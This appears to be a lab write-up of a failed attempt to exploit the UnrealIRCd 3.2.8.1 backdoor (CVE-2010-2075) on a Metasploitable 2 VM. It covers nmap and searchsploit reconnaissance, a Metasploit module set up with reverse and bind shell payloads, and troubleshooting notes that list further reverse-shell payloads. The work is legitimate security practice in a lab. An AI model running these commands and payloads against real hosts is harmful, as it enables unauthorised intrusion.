# Metasploitable 2 — UnrealIRCd 3.2.8.1 Backdoor Exploitation Attempt

**CVE:** CVE-2010-2075
**Target:** 192.168.100.10 (Metasploitable 2 in QEMU)
**Attacker:** Kali Linux (192.168.100.1)
**Date:** 24 September 2026
**Result:** Failed — no session created

## Summary

Attempted exploitation of the UnrealIRCd 3.2.8.1 backdoor. The
Metasploit check confirmed the target is vulnerable, but no shell
was returned in three attempts with different payloads.

## 1. Reconnaissance

    sudo nmap -sV -Pn 192.168.100.10

Key finding:

| Port | Service | Version |
|------|---------|---------|
| 6667 | irc     | UnrealIRCd |

Hostname: irc.Metasploitable.LAN

## 2. Vulnerability Identification

    searchsploit irc UnrealIRCd

Relevant results:

- UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)
  -> linux/remote/16922.rb
- UnrealIRCd 3.2.8.1 - Remote Downloader/Execute
  -> linux/remote/13853.pl

**CVE:** CVE-2010-2075

**Background:** The UnrealIRCd 3.2.8.1 source archive was
compromised between November 2009 and June 2010. A backdoor was
inserted into the DEBUG3_DOLOG_SYSTEM macro allowing remote
command execution via a specially crafted IRC command.

## 3. Exploitation Attempt

    msfconsole -q
    msf > search UnrealIRCd 3.2.8.1
    msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
    msf > set RHOSTS 192.168.100.10
    msf > set LHOST 192.168.100.1
    msf > set payload cmd/unix/reverse
    msf > run

Output:

    [+] 192.168.100.10:6667 - The target appears to be vulnerable.
    [*] 192.168.100.10:6667 - Sending IRC backdoor command
    [*] Exploit completed, but no session was created.

Retried with `cmd/unix/bind_perl` (port 4444) and then with
LPORT 5555. Same result — check passed, backdoor command sent,
no session.

## 4. Why It Failed — Analysis

The module confirmed the target is vulnerable and sent the
backdoor command, but no shell returned. Possible causes:

1. The backdoor command syntax didn't match what the module sent.
2. The target couldn't reach the attacker's IP (QEMU routing).
3. The bind payload's port was blocked or the process failed.
4. Payload compatibility — `bind_perl` requires Perl in PATH.
5. The service may have been restarted since the vulnerable
   version was installed.

## 5. Lessons Learned

1. A vulnerable service doesn't mean an automatic shell. The
   check passed, the exploit ran, and still nothing came back.
2. Payload selection matters. `cmd/unix/reverse` worked for
   Samba but not here. The right payload depends on what's
   installed on the target and the execution context.
3. Network issues in QEMU can silently break reverse shells.
   If the target can't reach the attacker, the handler starts,
   the exploit runs, and no session appears.
4. Documenting failures is valuable. The check output proves
   the vulnerability exists; the failed payloads show the
   troubleshooting process.

## 6. Next Steps

- Restart Metasploitable and retry with `cmd/unix/reverse_netcat`
- Try the standalone script: `searchsploit -m linux/remote/13853.pl`
- Verify target-to-attacker connectivity from a known session
  (port 1524 bindshell)
- Try `cmd/unix/reverse_perl` or `cmd/unix/reverse_python`
- Check whether `/bin/sh` exists and is executable on the target
